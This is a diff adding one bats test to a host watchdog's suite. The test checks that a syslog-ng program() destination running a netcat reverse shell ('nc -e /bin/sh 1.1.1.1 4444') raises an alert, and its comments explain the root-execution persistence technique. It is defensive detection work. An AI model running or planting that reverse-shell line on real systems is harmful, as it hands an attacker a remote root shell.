@@ -266,3 +266,19 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in syslog-ng program(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANTs across the brain. Lock the netcat axis on the
+    # syslog-ng program() log-event-trigger root-exec persistence
+    # surface (T1037/T1546 — program() destination invokes a
+    # subprocess AS ROOT for each matching log event; attacker who
+    # plants nc -e shell binary path gets remote shell on every
+    # matching event).
+    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'destination d_evil { program("/bin/sh -c \\"nc -e /bin/sh 1.1.1.1 4444\\""); };\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
